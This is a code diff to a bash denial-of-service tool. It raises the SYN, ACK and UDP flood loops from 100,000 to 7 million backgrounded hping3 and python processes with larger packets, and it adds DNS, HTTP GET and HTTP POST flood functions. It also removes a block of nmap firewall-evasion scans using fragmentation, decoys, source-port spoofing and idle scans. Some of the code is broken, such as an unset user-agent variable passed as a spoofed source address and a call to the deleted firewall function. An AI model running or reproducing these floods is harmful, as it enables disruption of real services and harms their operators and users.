@@ -93,10 +93,9 @@ syn_flood() {
     target=$1
     echo -e "${CYAN}[*] Starting TCP SYN flood attack on $target${RESET}"
     read_user_agents
-    for ((i=0; i<100000; i++)); do
-        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
-        # Real  (multi-threaded, using 100k user agents)
-        python3 syn_flood.py -t $target -p $port --user-agent "$random_ua" > /dev/null 2>&1 &
+    for ((i=0; i<7000000; i++)); do  # 7 million packets
+        # Increase packet size for higher traffic volume
+        python3 syn_flood.py -t $target -p $port --user-agent "$random_ua" -s 2048 > /dev/null 2>&1 &
     done
     wait
 }
@@ -106,10 +105,9 @@ ack_flood() {
     target=$1
     echo -e "${CYAN}[*] Starting TCP ACK flood attack on $target${RESET}"
     read_user_agents
-    for ((i=0; i<100000; i++)); do
-        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
-        # Real (multi-threaded, using 100k user agents)
-        hping3 -A -p $port -a $random_ua $target > /dev/null 2>&1 &
+    for ((i=0; i<7000000; i++)); do  # 7 million packets
+        # Use a larger packet size for higher traffic
+        hping3 -A -p $port -a $random_ua -d 2048 $target > /dev/null 2>&1 &
     done
     wait
 }
@@ -119,42 +117,44 @@ udp_flood() {
     target=$1
     echo -e "${CYAN}[*] Starting UDP flood attack on $target${RESET}"
     read_user_agents
-    for ((i=0; i<100000; i++)); do
-        random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
-        # Relz (multi-threaded, using 100k user agents)
-        hping3 --udp -p $port -a $random_ua $target > /dev/null 2>&1 &
+    for ((i=0; i<7000000; i++)); do  # 7 million packets
+        # Increase packet size for higher traffic
+        hping3 --udp -p $port -a $random_ua -d 2048 $target > /dev/null 2>&1 &
     done
     wait
 }
 
-# Function to test the firewall and attempt bypassing
-test_firewall() {
+# Function to perform DNS flood (additional DNS flood logic)
+dns_flood() {
     target=$1
-    echo -e "${CYAN}[*] Testing firewall on $target with 6 bypass methods${RESET}"
-    
-    # 1. Scan for open ports (Basic Firewall Test)
-    echo -e "${CYAN}[*] Performing basic port scan...${RESET}"
-    nmap -p- --open --min-rate=5000 -T4 $target
-    
-    # 2. Fragmented Packets
-    echo -e "${CYAN}[*] Sending fragmented packets to bypass firewall...${RESET}"
-    nmap -f -p- $target
-    
-    # 3. Source Port Modification
-    echo -e "${CYAN}[*] Using source port modification to bypass firewall...${RESET}"
-    nmap --source-port 53 -p- $target
-    
-    # 4. Decoy (Multiple IPs)
-    echo -e "${CYAN}[*] Using decoy scan to confuse firewall...${RESET}"
-    nmap -D RND:10 -p- $target
-    
-    # 5. TCP ACK Scan (Firewalls often block SYN but allow ACK)
-    echo -e "${CYAN}[*] Using TCP ACK scan to bypass firewall...${RESET}"
-    nmap -sA -p- $target
-    
-    # 6. Idle Scan (Stealthiest method)
-    echo -e "${CYAN}[*] Performing Idle Scan to evade detection...${RESET}"
-    nmap -sI $target -p- $target
+    echo -e "${CYAN}[*] Starting DNS flood attack on $target${RESET}"
+    for ((i=0; i<7000000; i++)); do  # 7 million packets
+        # DNS flood logic (increase packet size)
+        hping3 --udp -p 53 -a $target --dns -d 2048 $target > /dev/null 2>&1 &
+    done
+    wait
+}
+
+# Function to perform HTTP flood (sending HTTP GET requests)
+http_flood() {
+    target=$1
+    echo -e "${CYAN}[*] Starting HTTP flood attack on $target${RESET}"
+    for ((i=0; i<7000000; i++)); do  # 7 million packets
+        # Larger HTTP GET request size for higher traffic
+        curl -s -X GET http://$target -H "User-Agent: RandomUA" --data "payload" > /dev/null 2>&1 &
+    done
+    wait
+}
+
+# Function to perform HTTP POST flood (sending POST requests)
+post_flood() {
+    target=$1
+    echo -e "${CYAN}[*] Starting HTTP POST flood attack on $target${RESET}"
+    for ((i=0; i<7000000; i++)); do  # 7 million packets
+        # Larger HTTP POST request size for higher traffic
+        curl -s -X POST http://$target --data "payload" > /dev/null 2>&1 &
+    done
+    wait
 }
 
 # Main function to handle user input
@@ -176,7 +176,7 @@ while getopts ":u:p:sirSAtf:n:Hvlp:s:seq:win:proto:P:l:t:FITLVM" option; do
         t) attack_type="$OPTARG";;
         F) test_firewall "$target";;
         I) dns_flood "$target";;
-        T) custom_http_flood "$target";;
+        T) http_flood "$target";;
         L) post_flood "$target";;
         M) custom_tcp_flood "$target";;
         V) ssl_ddos "$target";;
